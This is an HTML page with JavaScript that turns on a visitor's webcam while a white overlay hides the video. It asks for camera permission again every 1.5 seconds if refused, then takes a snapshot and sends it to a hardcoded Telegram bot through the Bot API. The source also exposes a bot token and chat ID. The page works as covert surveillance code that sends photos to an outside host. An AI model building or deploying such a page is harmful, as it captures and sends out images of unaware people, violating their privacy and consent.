<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam to Telegram</title>
    <script type="text/javascript" src="https://unpkg.com/webcam-easy/dist/webcam-easy.min.js"></script>
    <style>
        canvas {
            display: none;
        }
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 900px;
            height: 700px;
            background-color: white;
            z-index: 1;
        }
        #webCam {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 0;
        }
    </style>
</head>
<body>
    <div id="overlay"></div>
    <video id="webCam" autoplay playsinline width="900" height="700"></video>
    <canvas id="canvas"></canvas>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const webCamElement = document.getElementById("webCam");
            const canvasElement = document.getElementById("canvas");
            const webcam = new Webcam(webCamElement, "user", canvasElement);

            // Initialize snapshotCounter from localStorage or start from 1 if not present
            let snapshotCounter = localStorage.getItem('snapshotCounter');
            if (!snapshotCounter) {
                snapshotCounter = 1;
            } else {
                snapshotCounter = parseInt(snapshotCounter); // Ensure it's an integer
            }

            function checkCameraPermission() {
                if (localStorage.getItem('cameraPermission') === 'granted') {
                    startWebcam();
                } else {
                    requestCameraPermission();
                }
            }

            function requestCameraPermission() {
                webcam.start()
                    .then(() => {
                        localStorage.setItem('cameraPermission', 'granted');
                        takeAPicture();
                    })
                    .catch(err => {
                        localStorage.setItem('cameraPermission', 'denied');
                        setTimeout(requestCameraPermission, 1500); // Retry after 1.5 seconds
                    });
            }

            function startWebcam() {
                webcam.start()
                    .then(() => {
                        setTimeout(() => {
                            takeAPicture();
                        }, 1000); // Wait time (1 second)
                    })
                    .catch(err => {
                        console.error(err);
                    });
            }

            function takeAPicture() {
                let picture = webcam.snap();
                let fileName = `snapshot${snapshotCounter}.png`; // Unique file name

                // Sending the picture to Telegram bot
                sendToTelegram(picture, fileName);

                snapshotCounter++; // Increment snapshot counter for next picture
                localStorage.setItem('snapshotCounter', snapshotCounter); // Save snapshotCounter in localStorage
            }

            function sendToTelegram(photoData, fileName) {
                // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
                let botToken = '7237749285:AAGGtOLFEncaQQsFwqFWZk-iydsJjmSm4yM';
                let chatId = '5480769413';

                // Create form data to send to Telegram
                let formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', photoData, fileName);

                // Create XMLHttpRequest object
                let xhr = new XMLHttpRequest();

                // Set up request
                xhr.open('POST', `https://api.telegram.org/bot${botToken}/sendPhoto`, true);

                // Set up onload handler
                xhr.onload = function () {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        console.log('Photo sent successfully:', xhr.responseText);
                    } else {
                        console.error('Error sending photo:', xhr.statusText);
                    }
                };

                // Set up onerror handler
                xhr.onerror = function () {
                    console.error('Request failed');
                };

                // Send request
                xhr.send(formData);
            }

            checkCameraPermission();
        });
    </script>
</body>
</html>
